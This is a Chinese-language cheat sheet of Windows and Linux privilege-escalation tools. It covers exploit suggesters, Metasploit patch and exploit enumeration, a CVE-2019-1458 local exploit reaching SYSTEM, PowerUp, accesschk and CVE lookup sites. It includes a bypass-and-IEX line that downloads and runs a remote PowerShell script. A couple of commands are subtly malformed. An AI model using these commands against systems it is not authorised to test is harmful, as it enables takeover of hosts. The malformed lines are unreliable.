网络安全
<a name="p25ou"></a>
## 常用的提权扫描辅助工具总结
<a name="a2vcN"></a>
### 使用Windows-Exploit-Suggester解析systeminfo
下载地址：[https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
```bash
./windows-exploit-suggester.py
```
<a name="K3zH2"></a>
### 使用Linux-Exploit-Suggester.sh寻找linux提权问题
下载地址：[https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
```bash
./linux-exploit-suggester.sh
```
<a name="N83uv"></a>
### 使用Sherlock工具
下载地址：[https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)
```bash
Import-Module Sherlock.ps1
Find-AllVulns
```
<a name="yXuwy"></a>
### 使用MSF查询补丁和可利用提权漏洞
```bash
#查询补丁

meterpreter> run post/windows/gather/enum_patches 
[+] KB2999226 installed on 11/25/2020
[+] KB976902 installed on 11/21/2010

#查询Exp

msf> use post/multi/recon/local_exploit_suggester 
msf> set LHOST <攻击机IP>
msf> set SESSION <session_id>
msf> run

# 使用示例

msf> use exploit/windows/local/cve_2019_1458_wizardopium 
msf> set SESSION <session_id>
msf> run
meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM
```
<a name="Uc55e"></a>
### 使用powerup检查提权漏洞
```bash
powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
powershell.exe -nop -exec bypass -c "IEX (New-object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks"
```
<a name="dd9Lc"></a>
### 使用accesschk.exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改
<a name="SC8Ey"></a>
#### 查看所有用户在d盘dir路径的子路径的权限
```bash
accesschk "d:\dir"
```
<a name="mDumq"></a>
#### 查看Administrator用户在d盘dir路径的子路径的权限
```bash
accesschk "Administrator "d:\dir"
```
<a name="DYAEU"></a>
#### 查看Administrators组对所有服务的权限
```bash
accesschk Administrators -c *
```
<a name="AkrK0"></a>
#### 查看Guest用户对hklm\software注册表的权限
```bash
accesschk -k Guest hklm\software
```
<a name="ZCvgh"></a>
#### 查看User用户对全局对象的权限
```bash
accesschk -ou User
```
<a name="Mvdrj"></a>
### 查找主机上具有的CVE，查找具有公开EXP的CVE的Python脚本
下载地址：[https://github.com/chroblert/WindowsVulnScan](https://github.com/chroblert/WindowsVulnScan)
```bash
.\KBCollect.ps1
python3 -m pip install requirements.txt
cve-check.py -u
```
查看具有公开EXP的CVE
```bash
cve-check.py -C -f KB.json
```
<a name="AVN4P"></a>
### 在线提权漏洞检测平台
极光无限出品的安全扫描仪，在提权方面，基于其强大的安全检测能力，能够给出专业的修复建议，有效验证和加固网络资产漏洞。<br />查询地址：[https://detect.secwx.com/](https://detect.secwx.com/)
<a name="BoWnQ"></a>
### 提权辅助网页
在Windows提权的时候，对比补丁找Exp很烦吧？这个网站数据源每周更新一次，值得推荐<br />查询地址：[http://bugs.hacking8.com/tiquan/](http://bugs.hacking8.com/tiquan/)
